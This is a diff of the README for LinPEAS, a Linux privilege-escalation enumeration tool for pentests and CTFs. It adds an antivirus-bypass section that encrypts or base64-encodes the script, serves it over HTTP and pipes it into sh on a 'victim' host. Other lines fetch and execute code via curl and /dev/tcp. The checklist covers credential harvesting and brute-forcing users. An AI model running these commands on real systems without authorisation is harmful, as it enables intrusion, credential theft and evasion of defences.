@@ -2,11 +2,11 @@
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)
 
-**LinPEAS is a script that searh for possible paths to escalate privileges on Linux/Unix\* hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation)**
+**LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\* hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation)**
 
 Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)**.
 
-[![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/279208)
+[![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/309566)
 
 
 ## Quick Start
@@ -17,12 +17,31 @@ curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-
 
 ```bash
 #Local network
-python -m SimpleHTTPServer 80
+sudo python -m SimpleHTTPServer 80
 curl 10.10.10.10/linpeas.sh | sh
 
 #Without curl
-nc -q 5 -lvnp 80 < linpeas.sh
+sudo nc -q 5 -lvnp 80 < linpeas.sh
 cat < /dev/tcp/10.10.10.10/80 | sh
+```
+
+```bash
+#Output to file
+linpeas -a > /dev/shm/linpeas.txt
+less -r /dev/shm/linpeas.txt #Read with colors
+```
+
+## AV bypass
+```bash
+#open-ssl encryption
+openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
+
+#Base64 encoded
+base64 -w0 linpeas.sh > lp.enc
+sudo python -m SimpleHTTPServer 80 #Start HTTP server
+curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
 
 **Use the parameter `-a` to execute all these checks.**
@@ -33,12 +52,12 @@ The goal of this script is to search for possible **Privilege Escalation Paths**
 
 This script doesn't have any dependency.
 
-It uses **/bin/sh** sintax, so can run in anything supporting `sh` (and the binaries and parameters used).
+It uses **/bin/sh** syntax, so can run in anything supporting `sh` (and the binaries and parameters used).
 
 By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**.
 
-By default linpeas takes around **1 min** to complete, but It could take from **3 to 4 minutes** to execute all the checks using **-a** parameter *(Recommended option for CTFs)*:
-- Less than 1 min to make almost all the checks
+By default linpeas takes around **2 mins** to complete, but It could take from **4 to 5 minutes** to execute all the checks using **-a** parameter *(Recommended option for CTFs)*:
+- From less than 1 min to 2 mins to make almost all the checks
 - Almost 1 min to search for possible passwords inside all the accesible files of the system
 - 20s/user bruteforce with top2000 passwords *(need `-a`)* - Notice that this check is **super noisy**
 - 1 min to monitor the processes in order to find very frequent cron jobs *(need `-a`)* - Notice that this check will need to **write** some info inside a file that will be deleted
@@ -46,6 +65,7 @@ By default linpeas takes around **1 min** to complete, but It could take from **
 **Other parameters:**
 - **-a** (all checks) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
 - **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
+- **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users
 
 This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
 
@@ -133,11 +153,12 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
 - **System Information**
   - [x] SO & kernel version 
   - [x] Sudo version
+  - [x] USBCreator PE
   - [x] PATH
   - [x] Date
   - [x] System stats
   - [x] Environment vars
-  - [x] SElinux
+  - [x] AppArmor, grsecurity, Execshield, PaX, SElinux, ASLR
   - [x] Printers
   - [x] Dmesg (signature verifications)
   - [x] Container?
@@ -150,12 +171,15 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Useful software
   - [x] Installed compilers
 
-- **Processes & Cron & Services**
+- **Processes, Cron, Services, Timers & Sockets**
   - [x] Cleaned processes
   - [x] Binary processes permissions
   - [x] Different processes executed during 1 min
   - [x] Cron jobs
-  - [x] Services
+  - [x] Services (list, writable .service, writable services binaries, systemd path, service binaries using relative path)
+  - [x] All timers (list, writable .timer, writable binaries, relative paths)
+  - [x] Sockets
+  - [x] D-Bus
 
 - **Network Information**
   - [x] Hostname, hosts & dns
@@ -211,19 +235,40 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Dovecot
   - [x] Mosquitto
   - [x] Neo4j
-
+  - [x] Cloud-Init
+  - [x] Erlang Cookie
+  - [X] GVM config
+  - [x] IPSEC files
+  - [x] IRSSI config file
+  - [x] Keyring files
+  - [x] Filelliza files
+  - [x] Backup-manager
+  - [x] Splunk
+  - [x] Gitlab
+  - [x] PGP/GPG files
+  - [x] Vim swp files
+  - [x] ctr
+  - [x] runc
+  - [x] Firefox user files
+  - [x] Google Chrome user files
+  - [x] Autologin files
 
 - **Generic Interesting Files**
   - [x] SUID & SGID files
   - [x] Capabilities
+  - [x] /etc/ld.so.conf.d/
   - [x] Users with capabilities
+  - [x] Files with ACLs
   - [x] .sh scripts in PATH
   - [x] scripts in /etc/profile.d
-  - [x] Hashes (passwd, shadow & master.passwd)
+  - [x] scripts in init, init.d and systemd
+  - [x] Hashes (passwd, group, shadow & master.passwd)
   - [x] Credentials in fstab
   - [x] Try to read root dir
   - [x] Files owned by root inside /home
   - [x] List of readable files belonging to root and not world readable
+  - [x] Files modified in the last 5 minutes
+  - [x] Log files (logrotten)
   - [x] Others files inside a folder owned by the current user
   - [x] Reduced list of files inside my home and /home
   - [x] Mail applications
@@ -239,6 +284,8 @@ file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm
   - [x] Get IPs, passwords and emails from logs
   - [x] password or credential files in home
   - [x] "pwd" and "passw" inside files (and get most probable lines)
+  - [x] Check for posible variable names containing credentials in files
+  - [x] Find "username" in fils
   - [x] Specific hashes (blowfish, joomla&vbulletin, phpbb3, wp, drupal, linuxmd5, apr1md5, sha512crypt, apachesha)
   - [x] Generic hashes MD5, SHA1, SHA256, SHA512
 </details>
@@ -249,11 +296,11 @@ If you want to **add something** and have **any cool idea** related to this proj
 
 ## Please, if this tool has been useful for you consider to donate
 
-[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=DED2HWDYLFT2C&source=url)
+[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://www.patreon.com/peass)
 
-## Looking for a useful Privilege Escalation Course?
+## PEASS Style
 
-Contact me and ask about the **Privilege Escalation Course** I am preparing for attackers and defenders (**100% technical**).
+Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas
 
 ## TODO
 
